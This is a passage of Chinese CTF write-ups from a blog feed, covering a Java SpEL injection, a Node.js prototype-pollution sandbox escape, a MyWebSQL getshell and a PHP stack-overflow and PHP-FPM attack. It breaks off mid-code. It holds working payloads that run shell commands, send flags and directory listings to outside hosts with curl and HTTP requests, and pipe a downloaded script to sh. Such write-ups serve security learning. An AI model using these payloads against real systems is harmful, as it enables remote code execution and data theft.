class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Encryptor.encrypt(&quot;c0dehack1nghere1&quot;, &quot;0123456789abcdef&quot;, &quot;#&#123;T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;ex\&quot;+\&quot;ec\&quot;,T(String[])).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;).getMethod(\&quot;getRu\&quot;+\&quot;ntime\&quot;).invoke(T(String).getClass().forName(\&quot;java.l\&quot;+\&quot;ang.Ru\&quot;+\&quot;ntime\&quot;)),new String[]&#123;\&quot;/bin/bash\&quot;,\&quot;-c\&quot;,\&quot;curl http://i.zeye.xyz/`cd / &amp;&amp; ls|base64|tr &apos;\\n&apos; &apos;-&apos;`\&quot;&#125;)&#125;&quot;));</span><br></pre></td></tr></table></figure></p><p>最终利用payload如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&#123;T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;ex&quot;+&quot;ec&quot;,T(String[])).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getMethod(&quot;getRu&quot;+&quot;ntime&quot;).invoke(T(String).getClass().forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;)),new String[]&#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;curl http://i.zeye.xyz/`cat flag_j4v4_chun|base64|tr &apos;\n&apos; &apos;-&apos;`&quot;&#125;)&#125;</span><br></pre></td></tr></table></figure></p><p>参考：<a href="http://rui0.cn/archives/1015" target="_blank" rel="noopener">《Code-Breaking Puzzles — javacon WriteUp》</a></p><h2 id="0x08-thejs"><a href="#0x08-thejs" class="headerlink" title="0x08 thejs"></a>0x08 thejs</h2><h3 id="1-漏洞相关知识点"><a href="#1-漏洞相关知识点" class="headerlink" title="1. 漏洞相关知识点"></a>1. 漏洞相关知识点</h3><p>原型链污染，因为JavaScript是使用原型链机制来实现继承的，因此就可能会在<strong>能够控制数组（对象）的“键名”的操作</strong>处存在可污染点。</p><p>详细分析参考：<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">《深入理解 JavaScript Prototype 污染攻击》</a></p><h3 id="2-题目解答"><a href="#2-题目解答" class="headerlink" title="2. 题目解答"></a>2. 题目解答</h3><p>如果想要修改父对象的原型，有如下两种方式</p><ol><li><code>inst.constructor.prototype</code> </li><li><code>inst.__proto__</code><br>那么推广一下的话，又有如下两种方式</li><li><code>inst[constructor][prototype][]</code></li><li><code>inst[__proto__][]</code><br>所以也就是说只要找对数组进行操作的地方，我们就有可能完成对原型的污染。但是还要注意的是想办法赋值的<code>__proto__</code>对象并不是真正的这个对象，所以想要写到真正的<code>__proto__</code>中，我们需要一层赋值。</li></ol><p>所以接下来构造攻击链的思路是: 找到一个未定义的变量，但是这个变量要在后面被调用。</p><p>经过分析发现<code>sourceURL</code>是未定义的。</p><p><img src="https://i.loli.net/2020/06/04/TJKoxFlDg6CupI5.png" alt="971DD02B-9513-4415-B169-D86B9863C087.png"></p><p>程序中只有一个输入点也就是<code>req.body</code>，之后经过<code>lodash.merge</code>将两个对象进行合并<br><img src="https://i.loli.net/2020/06/04/i9dxGr36fVF8ktJ.png" alt="屏幕快照 2019-09-05 上午10.53.41.png"></p><p>后面可以看到<code>sourceURL</code>在判断中被调用<br><img src="https://i.loli.net/2020/06/04/cG57yEqtanx9bV3.png" alt="A6DD32B7-C1A1-45E2-BF7F-F2526CA3956E.png"></p><p>因而成功造成原型链污染，之后在模板渲染中的<code>Function</code>函数中将造成任意代码执行，我们可以在控制台中简单测试一下</p><p><img src="https://pic.downk.cc/item/5ed863e9c2a9a83be5b390ba.png" alt></p><p>一般来说，nodejs中可以直接通过require导入包来达到rce的效果，如下所示</p><p><img src="https://pic.downk.cc/item/5ed8640ac2a9a83be5b3b4e6.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString()</span><br></pre></td></tr></table></figure><p>但是此题环境中有沙箱对此进行了限制，因此如下payload是无法成功的。需要对沙箱环境进行bypass<br>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.require(&apos;child_process&apos;).execSync(&apos;whoami&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>效果<br><img src="https://pic.downk.cc/item/5ed86424c2a9a83be5b3d1d4.png" alt></p><p>bypass的payload可以参考这篇文章</p><p><a href="https://xz.aliyun.com/t/4361" target="_blank" rel="noopener">https://xz.aliyun.com/t/4361</a></p><p>最终构造两个payload如下所示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot; : &#123;&quot;sourceURL&quot; : &quot;\r\nreturn e = () =&gt; &#123;for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125;return global.process.mainModule.constructor._load(&apos;child_process&apos;).execSync(&apos;ls&apos;).toString()&#125;\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;sourceURL&quot;:&quot;xxx\r\nvar require = global.require || global.process.mainModule.constructor._load;var result = require(&apos;child_process&apos;).execSync(&apos;cat /flag_thepr0t0js&apos;).toString();var req = require(&apos;http&apos;).request(`http://xxxx.ceye.io/$&#123;result&#125;`);req.end();\r\n&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p>此处还有一个小细节，就是原型链污染之后，除非重启环境，否则攻击效果一直都在，也就是你读取的flag将一直显示在网页上，所以必须在污染之后将变量恢复，省的泄露我们的flag。（这也就是上面for循环进行delete的原因）</p><p><img src="https://pic.downk.cc/item/5ed86439c2a9a83be5b3e7ba.png" alt></p><h3 id="3-参考"><a href="#3-参考" class="headerlink" title="3. 参考"></a>3. 参考</h3><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">《深入理解 JavaScript Prototype 污染攻击》</a></p><p><a href="https://lorexxar.cn/2018/12/07/codingbreak-wp/#hard-thejs" target="_blank" rel="noopener">《Code Breaking挑战赛 Writeup》</a></p><p><a href="http://adm1n.design/2019/05/07/proto2/" target="_blank" rel="noopener">《JavaScript Prototype 污染攻击 之 Code-Breaking-TheJS篇》</a></p><h2 id="0x09-picklecode"><a href="#0x09-picklecode" class="headerlink" title="0x09 picklecode"></a>0x09 picklecode</h2><p>害，这个先不写了，有时间再补吧</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00前言&quot;&gt;&lt;a href=&quot;#0x00前言&quot; class=&quot;headerlink&quot; title=&quot;0x00前言&quot;&gt;&lt;/a&gt;0x00前言&lt;/h2&gt;&lt;p&gt;题目知识点概述：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;function PHP函数利用技巧&lt;/li&gt;
&lt;li&gt;pcre
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2019 starctf writeup</title>
    <link href="http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/"/>
    <id>http://zer0yu.github.io/2019/09/15/2019-starctf-writeup/</id>
    <published>2019-09-14T16:07:18.000Z</published>
    <updated>2019-09-14T16:09:46.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这次的题目真的让我学了好久，哈哈</p><p>环境部署：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker build -t echohub:lastest .</span><br><span class="line">docker run -p 10080:80 -tid echohub</span><br><span class="line"># 进入容器执行命令</span><br><span class="line">docker exec -it suspicious_noether /bin/bash</span><br></pre></td></tr></table></figure></p><h2 id="0x01-WEB"><a href="#0x01-WEB" class="headerlink" title="0x01 WEB"></a>0x01 WEB</h2><h3 id="1-mywebsql"><a href="#1-mywebsql" class="headerlink" title="1. mywebsql"></a>1. mywebsql</h3><p>信息收集：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[09:42:18] 200 -    1KB - /README.md</span><br><span class="line">[09:42:51] 301 -  323B  - /backups  -&gt;  http://34.92.36.201:10080/backups/</span><br><span class="line">[09:42:52] 200 -    3KB - /backups/</span><br><span class="line">[09:42:59] 301 -  322B  - /config  -&gt;  http://34.92.36.201:10080/config/</span><br><span class="line">[09:43:00] 200 -    3KB - /config/</span><br><span class="line">[09:43:12] 200 -    9KB - /favicon.ico</span><br><span class="line">[09:43:19] 301 -  319B  - /img  -&gt;  http://34.92.36.201:10080/img/</span><br><span class="line">[09:43:20] 200 -    6KB - /index.php</span><br><span class="line">[09:43:21] 200 -    6KB - /index.php/login/</span><br><span class="line">[09:43:22] 200 -    6KB - /install.php</span><br><span class="line">[09:43:23] 301 -  318B  - /js  -&gt;  http://34.92.36.201:10080/js/</span><br><span class="line">[09:43:24] 301 -  320B  - /lang  -&gt;  http://34.92.36.201:10080/lang/</span><br><span class="line">[09:43:24] 301 -  319B  - /lib  -&gt;  http://34.92.36.201:10080/lib/</span><br><span class="line">[09:43:31] 301 -  323B  - /modules  -&gt;  http://34.92.36.201:10080/modules/</span><br><span class="line">[09:43:48] 403 -  304B  - /server-status/</span><br><span class="line">[09:43:48] 403 -  303B  - /server-status</span><br><span class="line">[09:43:58] 301 -  322B  - /themes  -&gt;  http://34.92.36.201:10080/themes/</span><br><span class="line">[09:43:58] 301 -  319B  - /tmp  -&gt;  http://34.92.36.201:10080/tmp/</span><br><span class="line">[09:43:58] 200 -  936B  - /tmp/</span><br></pre></td></tr></table></figure></p><p>源码:<br><a href="https://github.com/Samnan/MyWebSQL" target="_blank" rel="noopener">https://github.com/Samnan/MyWebSQL</a></p><p>导出建表，利用备份功能getshell</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/perl</span></span><br><span class="line"><span class="keyword">use</span> Expect;</span><br><span class="line">$obj = Expect-&gt;spawn( <span class="string">"./tmp/readflag"</span> );</span><br><span class="line"><span class="comment"># $obj-&gt;exp_internal( 1 );</span></span><br><span class="line">@result&#123; <span class="string">"position"</span>, <span class="string">"error"</span>, <span class="string">"match"</span>, <span class="string">"before"</span>, <span class="string">"after"</span> &#125; =$obj-&gt;expect(<span class="number">1</span>,<span class="string">-re=&gt;</span>qr/\(\(.*\)\)/);</span><br><span class="line"><span class="comment"># print $result&#123;"match"&#125;;</span></span><br><span class="line">$res=<span class="keyword">eval</span>($result&#123;<span class="string">"match"</span>&#125;);</span><br><span class="line"><span class="comment"># print $res;</span></span><br><span class="line">$pos=$obj-&gt;expect(<span class="number">1</span>,</span><br><span class="line">       [ <span class="regexp">qr/input your answer:\s*$/i</span>, </span><br><span class="line">         <span class="function"><span class="keyword">sub</span></span>&#123; <span class="keyword">my</span> $self = <span class="keyword">shift</span>; $self-&gt;<span class="keyword">send</span>( $res.<span class="string">"\r"</span> ); exp_continue;&#125; </span><br><span class="line">       ], </span><br><span class="line">    );</span><br><span class="line"><span class="comment"># print $pos;</span></span><br><span class="line">$obj-&gt;soft_close( );</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/15/JXUqS5pBEOsPben.png" alt="65748B37-692A-4809-8794-A714FC111F3F.png"></p><p>perl有个pp可以直接打包成二进制程序上传执行得到flag</p><p><img src="https://i.loli.net/2019/09/15/9VxGJh7HoBjg4iS.png" alt="屏幕快照 2019-04-28 上午10.00.10.png"></p><p>php的话可以利用如下方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 与二进制程序交互的脚本</span></span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"r"</span>), <span class="comment">// 标准输入，子进程从此管道读取数据</span></span><br><span class="line"><span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">"pipe"</span>, <span class="string">"w"</span>), <span class="comment">//标准输出，子进程向此管道写入数据</span></span><br><span class="line"><span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">"file"</span>, <span class="string">"/tmp/.a/errer-output.txt"</span>, <span class="string">"a"</span>), <span class="comment">//标准错误，写入到一个文件</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$cwd = <span class="string">'/'</span>;</span><br><span class="line">$env = arrat();</span><br><span class="line"></span><br><span class="line">$proess = proc_open(<span class="string">'/readflag'</span>, $descriptorspec, $pipes, $cwd, $env);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_resource($proess)) &#123;</span><br><span class="line">$a = fread($pipes[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line">$a = fread($pipes[<span class="number">1</span>], <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">$a = explode(<span class="string">"\n"</span>, $a);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="string">"\$result=$a[0];"</span>);</span><br><span class="line"></span><br><span class="line">fwrite($pipes[<span class="number">0</span>], <span class="string">"$result\n"</span>);</span><br><span class="line"></span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line">var_dump(fread($pipes[<span class="number">1</span>], <span class="number">1024</span>));</span><br><span class="line"></span><br><span class="line">fclose($pipes[<span class="number">0</span>]);</span><br><span class="line">fclose($pipes[<span class="number">1</span>]);</span><br><span class="line">$return_value = proc_close($proess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"command returned $return_value\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>官方使用如下perl脚本进行解答<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p><h3 id="2-echohub"><a href="#2-echohub" class="headerlink" title="2. echohub"></a>2. echohub</h3><h4 id="0-代码解密-amp-源代码描述的栈情况解读"><a href="#0-代码解密-amp-源代码描述的栈情况解读" class="headerlink" title="0. 代码解密&amp;源代码描述的栈情况解读"></a>0. 代码解密&amp;源代码描述的栈情况解读</h4><ol><li>这个base64编码的脚本中是含有脏数据的和一些特殊字符的，直接使用编辑器编辑可能会有一些问题，所以我在此先使用脚本将其解码之后使用二进制编辑器010editor进行编辑</li></ol><p>脚本如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &apos;base64_encode_phpcode_value&apos; | base64 -D &gt; ./log</span><br></pre></td></tr></table></figure></p><p>使用010editor打开</p><p><img src="https://i.loli.net/2019/09/15/BOgRCjHeoE92Wb5.png" alt="212B5D86-CE77-4CAE-B610-E183EBE9FAB2.png"></p><ol start="2"><li>在010editor编辑器中手动删除一下脏数据</li><li>使用phptorm/vscode进行动态调试或者使用<code>var_export</code>来对这里的变量替换表进行分析</li></ol><p><img src="https://i.loli.net/2019/09/15/T1F49IzKfStcaqM.png" alt="F4897E52-CFD9-4391-9C20-A18CFCF0AB68.png"><br>可以看到对应的变量表，之后写一个脚本来对加密的PHP文件进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'index.php'</span>;<span class="comment">// index.php为被加密的文件</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceString</span><span class="params">($match)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $O;</span><br><span class="line">    $index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">false</span> !== strpos($match[<span class="number">1</span>], <span class="string">'x'</span>))&#123;</span><br><span class="line">        $index = hexdec($match[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $index = $match[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( function_exists($O[$index]) || class_exists($O[$index]) || defined($O[$index]) )&#123;</span><br><span class="line">        <span class="keyword">return</span> $O[$index];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"'"</span>.addslashes($O[$index]).<span class="string">"'"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$encrypto_string = file_get_contents(<span class="string">'index.php'</span>);</span><br><span class="line">$encrypto_string = preg_replace_callback(<span class="string">'/\$GLOBALS[\[\&#123;]O0[\]\&#125;][\[\&#123;](\w&#123;1,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">$decrypto_string = preg_replace_callback(<span class="string">'/\$[O0]*[\[\&#123;](\w&#123;2,15&#125;)[\]\&#125;]/'</span>,<span class="string">'replaceString'</span>,$encrypto_string);</span><br><span class="line">file_put_contents(<span class="string">'decrypted.php'</span>, $decrypto_string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>PS: 此处有个坑点，使用sublime打开010editor处理后的代码是一堆16进制，但是使用vscode打开就问题。</p><h4 id="1-防护绕过-amp-栈溢出"><a href="#1-防护绕过-amp-栈溢出" class="headerlink" title="1. 防护绕过&amp;栈溢出"></a>1. 防护绕过&amp;栈溢出</h4><p>无论是aslr和canary的防护都是基于srand()的，而种子是time()，我们只要时区一样，那么本地和目标的time()的结果就是一样的，因而可以预测，进而绕过目标的防护机制。</p><p>此处我们的时区和目标主机是一样的，所以我们的time()是一样的，但是如果不一样，我们可以利用如下代码来从phpinfo获取对应的时间种子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line">define(<span class="string">'TARGET'</span>, <span class="string">'http://34.85.27.91:10080/'</span>);</span><br><span class="line"><span class="comment">// init random generator</span></span><br><span class="line">$client = <span class="keyword">new</span> GuzzleHttp\Client();</span><br><span class="line">$res = $client-&gt;request(<span class="string">'POST'</span>, TARGET, [</span><br><span class="line">  <span class="string">'form_params'</span> =&gt; [<span class="string">'data'</span> =&gt; <span class="string">'aaaa'</span>]</span><br><span class="line">]);</span><br><span class="line">preg_match(<span class="string">"/REQUEST_TIME'[^0-9]+(\d+)/"</span>, $res-&gt;getBody(), $matches);</span><br><span class="line">srand((int)$matches[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>栈溢出覆盖之后记得把canary对应的值填上就好了，栈的情况如下</p><table><thead><tr><th>7777</th><th>POST参数2</th></tr></thead><tbody><tr><td>6666</td><td>POST参数1</td></tr><tr><td>2</td><td>参数的数量</td></tr><tr><td>phpinfo地址</td><td>ret地址</td></tr><tr><td>EBP</td><td></td></tr><tr><td>canary</td><td></td></tr><tr><td>AAAAAAA</td><td></td></tr><tr><td>DATA:AAA</td><td>ESP</td></tr></tbody></table><p>因此对应的缓冲区的完整构造如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = str_repeat( <span class="string">'A'</span>, $padding_num ) . hexToStr( strrev( $canarycheck ) ) . <span class="string">"BBBB"</span> . hexToStr( strrev( dechex( $func_[<span class="string">'create_function'</span>] ) ) ) . <span class="string">'000266667777'</span>;</span><br></pre></td></tr></table></figure><h4 id="2-代码注入"><a href="#2-代码注入" class="headerlink" title="2. 代码注入"></a>2. 代码注入</h4><blockquote><p>参考自：<a href="https://www.exploit-db.com/exploits/32417" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/32417</a></p></blockquote><p>其实就是使用disable_functions没有包含的<code>create_function</code>进行代码注入造成任意命令执行，但是要注意的是，及时我们可以注入任意代码，但是这样的环境依旧受到disable_functions的制约，造成环境十分受限</p><h4 id="3-攻击fpm"><a href="#3-攻击fpm" class="headerlink" title="3. 攻击fpm"></a>3. 攻击fpm</h4><p>为什么要攻击fpm？因为我们通过<code>create_function</code>得到的是一个受限的shell，所以我们要办法突破这个环境的限制</p><blockquote><p>但PHP是一门强大的语言，PHP.INI中有两个有趣的配置项，auto_prepend_file和auto_append_file。</p><p>auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</p><p>那么就有趣了，假设我们设置auto_prepend_file为php://input，那么就等于在执行任何php文件前都要包含一遍POST的内容。所以，我们只需要把待执行的代码放在Body中，他们就能被执行了。（当然，还需要开启远程文件包含选项allow_url_include）</p></blockquote><p>引用自：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">《Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写》</a></p><p>之后就是利用这个漏洞老帮助我们执行命令，想要执行的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">'curl http://ebcece08.w1n.pw/getflag | sh'</span>);<span class="keyword">die</span>(<span class="string">'zeroyu'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>getflag的内容如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id;</span><br><span class="line">ls /;</span><br><span class="line">/readflag</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'dXNlIHN0cmljdDsKdXNlIElQQzo6T3BlbjM7CgpteSAkcGlkID0gb3BlbjMoXCpDSExEX0lOLCBcKkNITERfT1VULCBcKkNITERfRVJSLCAnL3JlYWRmbGFnJykgb3IgZGllICJvcGVuMygpIGZhaWxlZCAkISI7CgpteSAkcjsKCiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOwokcj1ldmFsICIkciI7CnByaW50ICIkclxuIjsKcHJpbnQgQ0hMRF9JTiAiJHJcbiI7CiRyID0gPENITERfT1VUPjsKcHJpbnQgIiRyIjsKJHIgPSA8Q0hMRF9PVVQ+OwpwcmludCAiJHIiOw=='</span>|base64 -d | perl</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"         "</span>;</span><br></pre></td></tr></table></figure></p><p>被base64编码的内容如下<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3(\*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span>) <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line"></span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r=<span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure></p><p>PS: 这种远程下载执行的方法可以有效缩短执行代码的长度</p><p>攻击代码的生成<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 